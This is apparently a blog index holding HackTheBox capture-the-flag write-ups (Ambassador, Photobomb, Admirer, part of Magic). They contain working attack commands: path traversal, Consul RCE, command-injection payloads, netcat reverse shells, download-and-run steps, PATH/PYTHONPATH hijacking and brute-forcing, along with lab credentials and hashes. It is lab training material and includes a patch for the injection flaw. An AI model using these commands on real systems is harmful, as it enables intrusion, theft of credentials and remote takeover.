(https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-22 13:41:07 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:3/p:4), ~1 try per task [DATA] attacking ssh://ambassador.htb:22/ 1 of 1 target completed, 0 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-22 13:41:17 Successfully login w/ admin:messageInABottle685427 However, grafana is not susceptible to any RCE exploit, lets try to obtain another set of credential by reading Grafana database file. Download /var/lib/grafana/grafana.db ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit] └─# curl -s &quot;http://ambassador.htb:3000/public/plugins/jaeger/../../../../../../../../../../../../../var/lib/grafana/grafana.db&quot; --path-as-is -o grafana.db View sqlite database file grafana.db w/ sqlitebrowser Download sqlitebrowser sudo add-apt-repository -y ppa:linuxgndu/sqlitebrowser sudo apt-get update sudo apt-get install sqlitebrowser Read grafana.db w/ sqlitebrowser # Query SELECT user, password, secure_json_data FROM data_source; Valid Creds grafana:dontStandSoCloseToMe63221! Root - Consul RCE (Manual) Create malicious json service configuration file to do RCE via consul API # Filename: exploit.json { &quot;ID&quot;: &quot;Reverse Shell&quot;, &quot;Name&quot;: &quot;Reverse Shell&quot;, &quot;Address&quot;: &quot;127.0.0.1&quot;, &quot;Port&quot;: 80, &quot;check&quot;: { &quot;Args&quot;: [ &quot;sh&quot;, &quot;-c&quot;, &quot;sh /tmp/exploit.sh&quot; ], &quot;interval&quot;: &quot;10s&quot;, &quot;Timeout&quot;: &quot;86400s&quot; } } Create payload exploit.sh #!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.104 4444 &amp;gt;/tmp/f Register the malicious service developer@ambassador:/tmp$ curl --header &quot;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&quot; --request PUT -T exploit.json http://127.0.0.1:8500/v1/agent/service/register root shell obtained ┌──(root💀kali)-[~/htb/photobomb] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 id Ncat: Connection from 10.10.11.183. Ncat: Connection from 10.10.11.183:58570. /bin/sh: 0: can&#39;t access tty; job control turned off # uid=0(root) gid=0(root) groups=0(root) root hash $6$AY/Hqk/PJgettbhs$mgg2hluJ8.leTpnrlEkh4RF7qE6Ns9j/TtV3Sx5OIsZ2YEA0OjGsJpmQlX2CFMmbwNjmvCZy9/Rcea4nF799V0 Demo - consul RCE (manual) Root - Config.d Directory From Ippsec Instead of using the API to register our malicious service, write a .hcl configuration file that will execute our reverse shell to the config.d directory. Proceed to /etc/consul.d, view files in directory developer@ambassador:/etc/consul.d$ ls -la total 24 drwxr-xr-x 3 consul consul 4096 Sep 27 14:49 . drwxr-xr-x 103 root root 4096 Sep 27 14:49 .. drwx-wx--- 2 root developer 4096 Sep 14 11:00 config.d -rw-r--r-- 1 consul consul 0 Feb 28 2022 consul.env -rw-r--r-- 1 consul consul 5303 Mar 14 2022 consul.hcl -rw-r--r-- 1 consul consul 160 Mar 15 2022 README developer@ambassador:/etc/consul.d$ drwx-wx--- 2 root developer 4096 Sep 14 11:00 config.d Write and Execute access for group developer for config.d directory Create exploit.hcl to execute our reverse shell developer@ambassador:/etc/consul.d/config.d$ nano exploit.hcl check = { id = &quot;rooted&quot; args = [&quot;/bin/bash&quot;, &quot;/tmp/exploit.sh&quot;], interval = &quot;5s&quot; } Reload consul to apply our configuration developer@ambassador:/etc/consul.d/config.d$ consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5 Configuration reload triggered Start listener and wait for reverse shell to execute Demo - Write to /etc/consul.d/config.d AESDecrypt Tool Fix If secureJsonData is used we have to decrypt it in order to obtain the password for sqlite Use this tool to do so ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798] └─# go run AESDecrypt.go AESDecrypt.go:12:2: cannot find package &quot;golang.org/x/crypto/pbkdf2&quot; in any of: /usr/lib/go-1.17/src/golang.org/x/crypto/pbkdf2 (from $GOROOT) /root/go/src/golang.org/x/crypto/pbkdf2 (from $GOPATH) Failed Fix Error - Source Create /usr/lib/go-1.17/src/golang.org/x/ directory ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798] └─# mkdir -p /usr/lib/go-1.17/src/golang.org/x/ Proceed to /usr/lib/go-1.17/src/golang.org/x/ and clone golang crypto repo ┌──(root💀kali)-[/usr/lib/go-1.17/src/golang.org/x] └─# git clone https://github.com/golang/crypto.git Cloning into &#39;crypto&#39;... Fixed ! ┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798] └─# go run AESDecrypt.go [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm [*] DataSourcePassword= R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q== [*] plainText= jas502n [*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm [*] PlainText= jas502n [*] EncodePassword= VTh1akR5aFf7zo3AvF2q8+8h69PdTvFtcjwBl70sjg== Decrypt secureJsonData Password w/ AESDecryptIf secureJsonData is used There are a few information we need to decrypt the password grafanaIni_secretKey - /etc/grafana/grafana.ini dataSourcePassword - /var/lib/grafana/grafana.db - use sqlitebrowser to view data_source table, obtain secure_json_data column value. " }, { "title": "HackTheBox - Photobomb", "url": "/posts/Photobomb/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/command-injection, path-hijacking", "date": "2022-10-16 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file photobomb.js containing credentials for /printer. /printer directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the filetype POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/wizard user.After enumerating the system, user wizard has a sudoers entry that allows user wizard to execute /opt/cleanup.sh as root and SETENV set the path environment. After analyzing cleanup.sh script, it is susceptible to a PATH Hijacking exploit due to calling find &amp;amp; chown w/o its FULL PATH, by creating a malicious script also called find or chown at a writable directory (/tmp), we are able to execute /opt/cleanup.sh and prepend /tmp to the PATH environment, causing our malicious script to execute first, instead of the actual binary, allowing us to privilege escalate to root. Column Details Box Name Photobomb IP 10.10.11.182 Points 20 Difficulty Easy Creator slartibartfast Release Date 08 Oct 2022 ReconTCP/80 (HTTP) FFUF Nothing interesting enumerated Initial FootholdTCP/80 (HTTP) - /printer (Basic Authentication), Creds Found Found a password protected directory, /printer Basic Authentication Credentials for the encrypted directory can be in a .js file that the page is referencing ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit] └─# curl http://photobomb.htb/photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; pH0t0:b0Mb! Successfully login w/ pH0t0:b0Mb! /printer allows authenticated users to select an image, change its dimensions, file extension (.jpg, .png) and download it. TCP/80 (HTTP) - /printer, Command Injection Download an image, intercept the request w/ burp Parameters: photo, filetype, dimensions Determine if the parameters are susceptible to SQLi ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit] └─# sqlmap -r printer.req --batch [13:54:59] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;/&#39;--risk&#39; options if you wish to perform more t ests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper=space2com ment&#39;) and/or switch &#39;--random-agent&#39; [13:54:59] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 219 times [*] ending @ 13:54:59 /2022-10-15/ Failed After some testing, I can conclude that This is a valid request photo - specify photo name, must match the photo that exists on the webserver, any invalid name will cause a 500 Internal Server Error - Source photo does not exist filetype - specify file type (jpg, png) only, however we are able to append anything as long as jpg or png is infront of the appended text. We can see that the request is processed filename=andrea-de-santis-uCFuP0Gc_MM-unsplash_1x1.jpg testing 123 dimensions - specify dimension numberxnumber Determine if filetype POST parameter is susceptible to command injection # Payload photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&amp;amp;filetype=jpg; echo &quot;Vulnerable to Command Injection!&quot; | nc 10.10.14.39 4444&amp;amp;dimensions=1x1 ┌──(root💀kali)-[~/htb/photobomb] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.182. Ncat: Connection from 10.10.11.182:35828. Vulnerable to Command Injection! It is vulnerable ! Could not Invoke reverse shell, instead we download a reverse shell payload onto photobomb.htb and execute it Create reverse shell payload #!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.39 4444 &amp;gt;/tmp/f Host reverse shell payload ┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit] └─# python3 -m http.server 80 Download it onto photobomb.htb &amp;amp; execute it! # Payload jpg;wget -O /tmp/exploit.sh 10.10.14.39/exploit.sh; chmod 777 /tmp/exploit.sh; sh /tmp/exploit.sh Demo - filetype Command Injection Demo - Invoke reverse shellPrivilege EscalationRoot - Enumeration View wizard sudo access wizard@photobomb:~$ sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh SETENV &amp;amp; execute /opt/cleanup.sh as root View /opt/cleanup.sh wizard@photobomb:~$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;amp;&amp;amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &amp;gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\; find &amp;amp; chown is not called w/ its FULL PATH, thus it is susceptible to PATH Hijacking What is PATH Hijacking When a command is executed w/o its full path, the system searches through the PATH environment variable for the specified command. Since we are able to SETENV, we can easily prepend a writable PATH (/tmp) Create a malicious binary at /tmp named the same as the binary that is not called w/ its FULL PATH Since /tmp is the first PATH in our path environment variable, /tmp/find will be invoked first, instead of the actual binary, allowing us to privilege escalate. Root - SUDO SETENV PATH Hijacking How do exploit /opt/cleanup.sh (PATH Hijacking) Since find is not called w/ its FULL PATH, we are able to do PATH Hijacking. Create a malicious script/binary called find at /tmp directory Execute /opt/cleanup.sh and prepend /tmp to the PATH environment variable. When find is called, the system will search /tmp directory and locates find and executes it, instead of the actual find binary, allowing us to privilege escalate to root. Exploiting /opt/cleanup.sh (PATH Hijacking) Create reverse shell script find wizard@photobomb:/tmp$ nano find rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.104 4444 &amp;gt;/tmp/f wizard@photobomb:/tmp$ nano find wizard@photobomb:/tmp$ chmod +x find Execute /opt/cleanup.sh as root and prepend /tmp to the PATH environment variable wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh root shell obtained ┌──(root💀kali)-[~/htb/photobomb] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.182. Ncat: Connection from 10.10.11.182:35754. # id;whoami uid=0(root) gid=0(root) groups=0(root) croot # d /root l# s root.txt # cat root.txt 84da75742fa76a4a515ed0665a5d1c29 # chown works as well! Demo - PATH Hijacking privilege escalation root hash $6$7MU2U.CeiY0WX91P$TUNn8zNu/XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V/yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240 AdditionalHow did the Command Injection exploit work? View server.rb ...SNIP... post &#39;/printer&#39; do photo = params[:photo] filetype = params[:filetype] dimensions = params[:dimensions] if !filetype.match(/^(png|jpg)/) halt 500, &#39;Invalid filetype.&#39; end filename = photo.sub(&#39;.jpg&#39;, &#39;&#39;) + &#39;_&#39; + dimensions + &#39;.&#39; + filetype response[&#39;Content-Disposition&#39;] = &quot;attachment; filename=#{filename}&quot; if !File.exists?(&#39;resized_images/&#39; + filename) command = &#39;convert source_images/&#39; + photo + &#39; -resize &#39; + dimensions + &#39; resized_images/&#39; + filename puts &quot;Executing: #{command}&quot; system(command) else puts &quot;File already exists.&quot; end ...SNIP... /printer accepts 3 POST parameters, photo, filetype, dimensions filetype POST parameter is susceptible to a command injection attack due to the lack of input sanitization, the webserver checks whether filetype POST parameter starts w/ png or jpg. This means that png ;&amp;lt;Command Injection), jpg &amp;lt;Command Injection&amp;gt; is valid. Next, the filetype parameter is directly passed into system where code execution happens, thus we are able to do command injection. Patch Command Injection Vulnerability Add another check for POST parameter filetype if !filetype.match(/^(png|jpg)/) halt 500, &#39;Invalid filetype.&#39; end ================================== ADDED ================================== if filetype.match(&#39;\\!|\\/|\\$|\\`|\\;&#39;) halt 500, &#39;Command Injection Failed&#39; end This will check whether filetype POST parameter contains dangerous characters. OR add $ if !filetype.match(/^(png|jpg)$/) halt 500, &#39;Invalid filetype.&#39; end filetype POST parameter must start w/ and end w/ png or jpg. Stop sinatra server wizard@photobomb:~/photobomb$ kill -9 $(pidof ruby) Start sinatra server wizard@photobomb:~/photobomb$ ruby server.rb Command Injection Patched ! HTTP/1.1 500 Internal Server Error Server: nginx/1.18.0 (Ubuntu) Date: Sun, 23 Oct 2022 09:22:07 GMT Content-Type: text/html;charset=utf-8 Content-Length: 24 Connection: close X-Xss-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Command Injection Failed Demo - Command Injection Patched " }, { "title": "HackTheBox - Admirer", "url": "/posts/Admirer/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/python-hijacking", "date": "2022-09-28 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering /admin-dir, containing credentials for FTP, FTP contains an archive of the web directory, revealing a directory utility-scripts that we did not discover earlier.Directory enumerating utility-scripts directory, discovered adminer.php, adminer.php is susceptible to a file exfiltration vulnerability, allowing us to exfiltrate index.php containing MySQL credentials, allowing us to SSH as user waldo.User waldo has a sudoers entry that allows waldo to use SETENV and run admin_task.sh as root. admin_task.sh is susceptible to a Python PATH Hijacking exploit, due to calling a python script (backup.py). backup.py is importing a library called shutil.py.We are able to do Python PATH Hijacking by setting python path environment to /tmp where our malicious python script shutil.py resides, when admin_task.sh is executed, our malicious python library is called instead of the legitimate library, invoking a reverse shell, privilege escalating us to root.If you wish to practice machines that are similar to this try: TryHackMe Wonderland TryHackMe Linux Agency TryHackMe HackerOne Easy HackTheBox FriendZone Column Details Box Name Admirer IP 10.10.10.187 Points 20 Difficulty Easy Creator polarbearer &amp;amp; GibParadox Release Date 02 May 2020 ReconTCP/80 (HTTP) FFUF images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 36ms] index.php [Status: 200, Size: 6051, Words: 385, Lines: 154, Duration: 37ms] robots.txt [Status: 200, Size: 138, Words: 21, Lines: 5, Duration: 35ms] robots.txt ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# curl http://admirer.htb/robots.txt User-agent: * # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo Disallow: /admin-dir Initial FootholdTCP/80 (HTTP) - /admin-dir, creds found Directory enumerate /admin-dir/FUZZ ┌──(root💀kali)-[~/htb/admirer] └─# ffuf -u http://admirer.htb/admin-dir/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.txt,.html&#39; :: Method : GET :: URL : http://admirer.htb/admin-dir/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .txt .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ contacts.txt [Status: 200, Size: 350, Words: 19, Lines: 30, Duration: 40ms] [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms] .html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms] credentials.txt [Status: 200, Size: 136, Words: 5, Lines: 12, Duration: 37ms] :: Progress: [661638/661638] :: Job [1/1] :: 1101 req/sec :: Duration: [0:10:09] :: Erro credentials.txt Obtain credentials ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# curl -s http://admirer.htb/admin-dir/credentials.txt | grep -vP &quot;\\[\\S+&quot; | sed -z &#39;s/\\n\\n/\\n/g&#39; | tee creds.txt w.cooper@admirer.htb fgJr6q#S\\W:$P ftpuser %n?4Wz}R$tTF7 admin w0rdpr3ss01! Bruteforce w/ Creds found Bruteforce SSH w/ hydra ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# hydra -L creds.txt -P creds.txt ssh://admirer.htb Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-27 18:14:00 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task [DATA] attacking ssh://admirer.htb:22/ [22][ssh] host: admirer.htb login: ftpuser password: %n?4Wz}R$tTF7 ftpuser:%n?4Wz}R$tTF7 Bruteforce FTP w/ hydra ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# hydra -L creds.txt -P creds.txt ftp://admirer.htb Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 01:08:55 [DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task [DATA] attacking ftp://admirer.htb:21/ [21][ftp] host: admirer.htb login: ftpuser password: %n?4Wz}R$tTF7 ftpuser:%n?4Wz}R$tTF7 TCP/22 (SSH) - Failed Failed to SSH, connection closes instantly ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html] └─# sshpass -p &#39;%n?4Wz}R$tTF7&#39; ssh ftpuser@admirer.htb Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Sep 27 19:05:38 2022 from 10.10.14.14 Connection to admirer.htb closed. TCP/21 (FTP) - Analyzing the files in FTP Download all files in FTP ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# wget --no-passive -q -m --ftp-user=&quot;ftpuser&quot; --ftp-password=&#39;%n?4Wz}R$tTF7&#39; ftp://10.10.10.187:21 View directory structure of FTP ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot] └─# tree -a 10.10.10.187/ 10.10.10.187/ ├── dump.sql ├── html.tar.gz └── .listing 0 directories, 3 files dump.sql does not contain any interesting information View directory structure of html ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html] └─# tree -d . ├── assets │   ├── css │   │   └── images │   ├── js │   ├── sass │   │   ├── base │   │   ├── components │   │   ├── layout │   │   └── libs │   └── webfonts ├── images │   ├── fulls │   └── thumbs ├── utility-scripts └── w4ld0s_s3cr3t_d1r 15 directories index.php - Creds: waldo:]F7jLHw:*G&amp;gt;UPrTo}~A assets - contains .css &amp;amp; .js files images - contains .jpg files utility-scripts - contains .php files w/ credentials w4ld0s_s3cr3t_d1r - same as /admin-dir View directory structure of utility-scripts ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html] └─# tree utility-scripts utility-scripts ├── admin_tasks.php ├── db_admin.php ├── info.php └── phptest.php 0 directories, 4 files admin_tasks.php - not vulnerable to any SQLi db_admin - Creds: waldo:Wh3r3_1s_w4ld0? info.php - not vulnerable phptest.php - not vulnerable After obtaining more creds, hydra did not find any valid login.TCP/80 (HTTP) - /utility-scripts, Found Adminer database management tool Directory /utility-scripts and the files residing in it exists, however, the .php files are not vulnerable. Directory enumerate /utility-scripts against big.txt ┌──(root💀kali)-[~/htb/admirer/10.10.10.187] └─# ffuf -u http://admirer.htb/utility-scripts/FUZZ -w /usr/share/dirb/wordlists/big.txt -e &#39;.txt,.php&#39; info.php [Status: 200, Size: 83860, Words: 4033, Lines: 962, Duration: 43ms] info.php [Status: 200, Size: 83860, Words: 4033, Lines: 962, Duration: 48ms] adminer.php [Status: 200, Size: 4295, Words: 189, Lines: 52, Duration: 107ms] :: Progress: [13848/13848] :: Job [1/1] :: 1075 req/sec :: Duration: [0:00:12] :: Errors: 0 :: adminer.php Found a login page @ adminer.php I knew exactly what to do because I exploited the same vulnerability in Vulnhub ReadMeTCP/80 (HTTP) - Setup MySQL on Kali Install MySQL ┌──(root💀kali)-[~/vulnHub/ReadMe] └─# sudo apt-get install mariadb-server Authenticate mysql Create a user w/ all privileges on a database MariaDB [mysql]&amp;gt; CREATE USER &#39;yf&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]&amp;gt; SET PASSWORD FOR &#39;yf&#39;@&#39;%&#39; = PASSWORD(&#39;password&#39;); Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]&amp;gt; GRANT ALL PRIVILEGES ON *.* TO &#39;yf&#39;@&#39;%&#39;; Query OK, 0 rows affected (0.000 sec) Enable local_infile on Kali’s MySQL Server SET GLOBAL local_infile = true; Verify that local_infile is enabled SHOW GLOBAL VARIABLES LIKE &#39;local_infile&#39;; Allow remote connections # Changed from 127.0.0.1 -&amp;gt; 0.0.0.0 nano /etc/mysql/mariadb.conf.d/50-server.cnf Proceed to adminer.php &amp;amp; login w/ yf:password TCP/80 (HTTP) - Adminer data exfiltration Create a table exploit Proceed to SQL Command, populate the exploit table w/ data we want to exfiltrate /etc/passwd # MySQL Query load data local infile &#39;/etc/passwd&#39; into table mysql.exploit fields terminated by &quot;\\n&quot; The open_basedir is a server configuration, a security measure to disallow file access. /etc/passwd is not in the configured path /var/www/html/index.php # MySQL Query load data local infile &#39;/var/www/html/index.php&#39; into table mysql.exploit fields terminated by &quot;\\n&quot; It worked! This file is chosen because earlier, we saw that it contains credentials View exfiltrated file index.php waldo:&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt; TCP/22 (SSH) Successfully SSH w/ waldo:&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt; ┌──(root💀kali)-[~/htb/admirer/10.10.10.187/loot/10.10.10.187/html] └─# sshpass -p &#39;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&#39; ssh waldo@admirer.htb Privilege EscalationRoot - Enumeration Check user waldo sudo access waldo@admirer:~$ sudo -l [sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=always User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh SETENV - Able to set $PATH environment, allowing us to do a PATH Hijacking exploit on executables/binaries that is called w/o their FULL PATH View admin_tasks.sh #!/bin/bash view_uptime() { /usr/bin/uptime -p } view_users() { /usr/bin/w } view_crontab() { /usr/bin/crontab -l } backup_passwd() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_shadow() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_web() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp;amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_db() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &amp;gt; /srv/ftp/dump.sql &amp;amp; /usr/bin/mysqldump -u root admirerdb &amp;gt; /var/backups/dump.sql &amp;amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } All of the binaries called are called w/ their FULL PATH, PATH Hijacking is not possible, except the function backup_web() where a python script is called. View backup.py waldo@admirer:~$ cat /opt/scripts/backup.py #!/usr/bin/python3 from shutil import make_archive src = &#39;/var/www/html/&#39; # old ftp directory, not used anymore #dst = &#39;/srv/ftp/html&#39; dst = &#39;/var/backups/html&#39; make_archive(dst, &#39;gztar&#39;, src) Able to do Python PATH Hijacking What is Python Hijacking Python code in one module gains access to the code in another module by the process of importing it. If a module is imported, PYTHONPATH is responsible for telling python where is that specific module by checking for the directories defined in PYTHONPATH Modules residing in the directory that the python script is executed supersedes/takes priority over the default python path. Root - Exploiting admin_task.sh w/ SETENV (Python Path Hijacking) How do we exploit admin_task.sh? Since backup_web() is calling a python script (backup.py), we are able to do Python Path Hijacking. backup.py is importing shutil.py, specifically make_archive function Create a malicious python script called shutil.py that has a function make_archive(), containing malicious code, in a writable directory (/tmp) Execute admin_task.sh as root and set the python path to /tmp When backup_web() is called, backup.py will be executing our malicious python library. Exploiting admin_task.sh (Python Path Hijacking) View make_archive function in shutil.py waldo@admirer:/tmp$ cat /usr/lib/python3.5/shutil.py | grep -A1 &quot;make_archive(&quot; def make_archive(base_name, format, root_dir=None, base_dir=None, verbose=0, dry_run=0, owner=None, group=None, logger=None): Create malicious python script make_archive import os; def make_archive(base_name, format, root_dir=None, base_dir=None, verbose=0, dry_run=0, owner=None, group=None, logger=None): os.system(&quot;nc 10.10.14.14 4444 -e /bin/bash&quot;) Start netcat listener ┌──(root💀kali)-[~/htb/admirer] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Execute admin_task.sh as root and set python path to invoke reverse shell waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh Demo - Exploiting admin_task.sh w/ SETENV (Python Path Hijacking) AdditionalConfigure admin_task.sh to do regular Path Hijacking Edit admin_task.sh, view_uptime() function view_uptime() { uptime -p } Remove its full PATH Create malicious bash script named uptime #!/bin/bash nc 10.10.14.14 4444 -e /bin/bash Make it executable waldo@admirer:/tmp$ chmod +x uptime Execute admin_task.sh as root and set path to invoke reverse shell sudo PATH=/tmp:$PATH /opt/scripts/admin_tasks.sh Demo - Regular Path Hijacking w/ SETENV Configure PHP so that Adminer is able to load any file Earlier, we are restricted by open_basedir setting, it restricted us to only exfiltrating files in /var/www/html Remove /var/www/html from open_basedir setting so that we are able to exfiltrate any file root@admirer:/var/www/html/utility-scripts# nano /etc/php/7.0/apache2/php.ini ... ; open_basedir, if set, limits all file operations to the defined directory ; and below. This directive makes most sense if used in a per-directory ; or per-virtualhost web server configuration file. ; http://php.net/open-basedir open_basedir = ... Restart apache2 root@admirer:/var/www/html/utility-scripts# service apache2 restart Restarting Apache httpd web server: apache2. Exfiltrate /etc/passwd # MySQL Query load data local infile &#39;/etc/passwd&#39; into table mysql.exploit fields terminated by &quot;\\n&quot; View exfiltrated file /etc/passwd " }, { "title": "HackTheBox - Magic", "url": "/posts/Magic/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-upload-bypass, linux-priv-esc/suid/path-hijacking, pivot, exploit/sqli/auth-bypass", "date": "2022-09-27 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering login.php, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redirected to upload.php where only images and be uploaded, however it is susceptible to an file upload bypass, allowing us to insert webshell to execute code, allowing us to obtain a low-privilege/www-data shell.For the privilege escalation part, we have to privilege escalate to theseus and then to root. Since there was a login page earlier, we found database credentials on a database configuration file db5.php. However, we do not have mysql on magic.htb, to overcome this, we use a PHP file to query the database, obtaining the password for user theseus.After further enumerating the system for files with setuid bit, a binary sysinfo is discovered and is susceptible to a PATH hijacking exploit, due to not calling executables w/ their full PATH. We unset our PATH environment and added /tmp, next, we created a malicious reverse shell bashscript called fdisk, so when fdisk is executed during sysinfo, the reverse shell is invoked, allowing us to privilege escalate to 